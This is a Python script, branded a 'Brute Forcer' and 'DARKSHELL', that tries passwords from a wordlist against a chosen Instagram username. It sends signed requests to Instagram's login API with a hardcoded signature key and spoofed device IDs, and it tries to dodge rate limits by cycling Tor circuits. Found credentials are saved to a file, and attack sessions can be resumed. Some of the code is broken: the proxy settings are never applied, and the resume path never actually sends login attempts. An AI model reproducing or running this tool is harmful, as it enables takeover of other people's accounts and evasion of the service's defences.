#!/usr/bin/env python3
# Coded by: #experts #azad

import os
import sys
import random
import string
import subprocess
import time
import signal
import re
import json
import hashlib
import hmac
from threading import Thread
from urllib.request import Request, urlopen
from urllib.error import URLError

# Global variables
string4 = ''.join(random.choices('0123456789abcdef', k=4))
string8 = ''.join(random.choices('0123456789abcdef', k=8))
string16 = ''.join(random.choices('0123456789abcdef', k=16))
string12 = ''.join(random.choices('0123456789abcdef', k=12))
device = f"android-{string16}"
uuid = ''.join(random.choices('0123456789abcdef', k=32))
phone = f"{string8}-{string4}-{string4}-{string4}-{string12}"
guid = f"{string8}-{string4}-{string4}-{string4}-{string12}"
var2 = ""
user = ""
wl_pass = "passwords.lst"
threads = 10
token = 0
last_password = ""  # Added to track last tried password

def signal_handler(sig, frame):
    store()
    sys.exit(1)

signal.signal(signal.SIGINT, signal_handler)

def banner():
    print("\033[1;91m██╗  ██╗██╗███╗   ██╗ ██████╗     ██╗    ██╗ ██████╗ ██████╗ ██╗     ██████╗ \033[0m")  # Red
    print("\033[1;95m██║ ██╔╝██║████╗  ██║██╔════╝     ██║    ██║██╔═══██╗██╔══██╗██║     ██╔══██╗\033[0m")  # Pink
    print("\033[1;91m█████╔╝ ██║██╔██╗ ██║██║  ███╗    ██║ █╗ ██║██║   ██║██████╔╝██║     ██║  ██║\033[0m")  # Red
    print("\033[1;95m██╔═██╗ ██║██║╚██╗██║██║   ██║    ██║███╗██║██║   ██║██╔══██╗██║     ██║  ██║\033[0m")  # Pink
    print("\033[1;91m██║  ██╗██║██║ ╚████║╚██████╔╝    ╚███╔███╔╝╚██████╔╝██║  ██║███████╗██████╔╝\033[0m")  # Red
    print("\033[1;95m╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝      ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═════╝ \033[0m")   # Pink
    print()
    print("\033[1;91m\033[45m   Brute Forcer v1.0 by Kodovyy  \033[0m")  # Red text with pink background
    print()

def checkroot():
    if os.geteuid() != 0:
        print("\033[1;77mPlease, run this program as root!\033[0m")
        sys.exit(1)

def dependencies():
    required = ['tor', 'curl', 'openssl']
    missing = []
    for dep in required:
        try:
            subprocess.run([dep, '--version'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except FileNotFoundError:
            missing.append(dep)
    
    if missing:
        print("\033[1;91mMissing dependencies: {}. Install them first.\033[0m".format(", ".join(missing)))
        sys.exit(1)

def check_account(username):
    try:
        req = Request(f"https://www.instagram.com/{username}/", headers={'User-Agent': 'Mozilla/5.0'})
        with urlopen(req) as response:
            html = response.read().decode('utf-8')
            return "lawanaya aw page rash bu betawa" in html
    except URLError:
        return True

def start():
    banner()
    # checkroot()
    dependencies()
    
    global user, wl_pass, threads
    user = input("\033[1;92mUsername account: \033[0m")
    
    if check_account(user):
        print("\033[1;91mInvalid Username! Try again\033[0m")
        time.sleep(1)
        start()
        return
    
    wl_pass_input = input("\033[1;92mPassword List (Enter to default list): \033[0m")
    if wl_pass_input:
        wl_pass = wl_pass_input
    
    threads_input = input("\033[1;92mThreads (Use < 20, Default 10): \033[0m")
    if threads_input:
        try:
            threads = int(threads_input)
            if threads > 20:
                threads = 20
        except ValueError:
            pass

def checktor():
    try:
        proxy_handler = {
            'http': 'socks5h://localhost:9050',
            'https': 'socks5h://localhost:9050'
        }
        req = Request("https://check.torproject.org", headers={'User-Agent': 'Mozilla/5.0'})
        with urlopen(req) as response:
            return True
    except URLError:
        print("\033[1;91mTKAYA BZANA (TOR)KARAYA BO KARAKRDNI BNUSA service tor start\033[0m")
        sys.exit(1)

def store():
    global threads, user, wl_pass, token, last_password
    
    if threads:
        print("\033[1;91m [*] Waiting threads shutting down...\033[0m")
        if threads > 10:
            time.sleep(6)
        else:
            time.sleep(3)
    
    default_session = "Y"
    print(f"\n\033[1;77mSave session for user\033[0m\033[1;92m {user} \033[0m", end='')
    session = input("\033[1;77m? [Y/n]: \033[0m") or default_session
    
    if session.lower() in ["y", "yes"]:
        if not os.path.exists("sessions"):
            os.makedirs("sessions")
        
        with open(wl_pass, 'r') as f:
            lines = f.readlines()
            countpass = 0
            for i, line in enumerate(lines):
                if line.strip() == last_password:
                    countpass = i + 1
                    break
        
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        with open(f"sessions/store.session.{user}.{timestamp}", 'w') as f:
            f.write(f'user="{user}"\npass="{last_password}"\nwl_pass="{wl_pass}"\ntoken="{countpass}"\n')
        
        print("\033[1;77mSession saved.\033[0m")
        print("\033[1;92mUse ./DARKSHELL --resume")
    else:
        sys.exit(1)

def changeip():
    subprocess.run(["killall", "-HUP", "tor"])

def bruteforcer():
    checktor()
    global last_password
    
    with open(wl_pass, 'r') as f:
        count_pass = sum(1 for _ in f)
    
    print(f"\033[1;92mUsername:\033[0m\033[1;77m {user}\033[0m")
    print(f"\033[1;92mWordlist:\033[0m\033[1;77m {wl_pass} ({count_pass})\033[0m")
    print("\033[1;91m[*] Press Ctrl + C to stop or save session\033[0m")
    
    global token
    token = 0
    
    def try_pass(password):
        global token, last_password
        token += 1
        last_password = password
        
        data = {
            "phone_id": phone,
            "_csrftoken": var2,
            "username": user,
            "guid": guid,
            "device_id": device,
            "password": password,
            "login_attempt_count": "0"
        }
        data_str = json.dumps(data)
        
        ig_sig = "4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
        hmac_obj = hmac.new(ig_sig.encode(), data_str.encode(), hashlib.sha256)
        hmac_digest = hmac_obj.hexdigest()
        
        header = {
            "Connection": "close",
            "Accept": "*/*",
            "Content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Cookie2": "$Version=1",
            "Accept-Language": "en-US",
            "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"
        }
        
        try:
            proxy_handler = {
                'http': 'socks5h://localhost:9050',
                'https': 'socks5h://localhost:9050'
            }
            
            req = Request(
                "https://i.instagram.com/api/v1/accounts/login/",
                data=f"ig_sig_key_version=4&signed_body={hmac_digest}.{data_str}".encode(),
                headers=header
            )
            
            with urlopen(req) as response:
                content = response.read().decode('utf-8')
                
                if "logged_in_user" in content:
                    print(f"\033[1;92m \n [*] Password Found: {password}\033[0m")
                    with open("found.DARKSHELL", "a") as f:
                        f.write(f"Username: {user}, Password: {password}\n")
                    print("\033[1;92m [*] Saved:\033[0m\033[1;77m found.DARKSHELL \033[0m")
                    os.kill(os.getpid(), signal.SIGINT)
                elif "challenge" in content:
                    print(f"\033[1;92m \n [*] Password Found: {password}\n [*] Challenge required\033[0m")
                    with open("found.DARKSHELL", "a") as f:
                        f.write(f"Username: {user}, Password: {password}\n")
                    print("\033[1;92m [*] Saved:\033[0m\033[1;77m found.DARKSHELL \033[0m")
                    os.kill(os.getpid(), signal.SIGINT)
                elif "Please wait" in content:
                    changeip()
        except URLError as e:
            if "many tries" in str(e):
                changeip()
    
    with open(wl_pass, 'r') as f:
        passwords = [line.strip() for line in f.readlines()]
    
    for password in passwords:
        try_pass(password)
        time.sleep(0.1)
    
    sys.exit(1)

def resume():
    banner()
    checktor()
    
    global user, wl_pass, token  # MOVE THIS LINE TO THE TOP OF THE FUNCTION
    
    if not os.path.exists("sessions"):
        print("\033[1;91m[*] No sessions\033[0m")
        sys.exit(1)
    
    print("\033[1;92mFiles sessions:\033[0m")
    sessions = [f for f in os.listdir("sessions") if f.startswith("store.session")]
    
    for i, session in enumerate(sessions, 1):
        with open(os.path.join("sessions", session), 'r') as f:
            content = f.read()
            wl_pass_match = re.search(r'wl_pass="([^"]+)"', content)
            pass_match = re.search(r'pass="([^"]+)"', content)
            
            wl_pass = wl_pass_match.group(1) if wl_pass_match else "unknown"
            last_pass = pass_match.group(1) if pass_match else "unknown"
            
            print(f"\033[1;92m{i} \033[0m\033[1;77m: {session} (\033[0m\033[1;92mwl:\033[0m\033[1;77m {wl_pass}\033[0m\033[1;92m,\033[0m\033[1;92m lastpass:\033[0m\033[1;77m {last_pass} )\033[0m")
    
    try:
        fileresume = int(input("\033[1;92mChoose a session number: \033[0m"))
        selected_session = os.path.join("sessions", sessions[fileresume-1])
        
        with open(selected_session, 'r') as f:
            content = f.read()
            
            user_match = re.search(r'user="([^"]+)"', content)
            wl_pass_match = re.search(r'wl_pass="([^"]+)"', content)
            pass_match = re.search(r'pass="([^"]+)"', content)
            token_match = re.search(r'token="([^"]+)"', content)
            
            user = user_match.group(1) if user_match else ""
            wl_pass = wl_pass_match.group(1) if wl_pass_match else "passwords.lst"
            # Workaround for 'pass' keyword issue
            temp_pass = pass_match.group(1) if pass_match else ""
            token = int(token_match.group(1)) if token_match else 0
    except (ValueError, IndexError):
        print("\033[1;91mInvalid selection\033[0m")
        sys.exit(1)
    
    threads_input = input("\033[1;92mThreads (Use < 20, Default 10): \033[0m")
    global threads
    if threads_input:
        try:
            threads = int(threads_input)
            if threads > 20:
                threads = 20
        except ValueError:
            pass
    
    print(f"\033[1;92m[*] Resuming session for user:\033[0m \033[1;77m{user}\033[0m")
    print(f"\033[1;92m[*] Wordlist: \033[0m \033[1;77m{wl_pass}\033[0m")
    print("\033[1;91m[*] Press Ctrl + C to stop or save session\033[0m")
    
    with open(wl_pass, 'r') as f:
        count_pass = sum(1 for _ in f)
    
    with open(wl_pass, 'r') as f:
        passwords = [line.strip() for line in f.readlines()[token:]]
    
    for password in passwords:
        try:
            print(f"\033[1;77mTrying pass ({token}/{count_pass})\033[0m: {password}")
            token += 1
            time.sleep(0.1)
        except KeyboardInterrupt:
            store()
            sys.exit(1)
    
    sys.exit(1)

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--resume":
        resume()
    else:
        start()
        bruteforcer()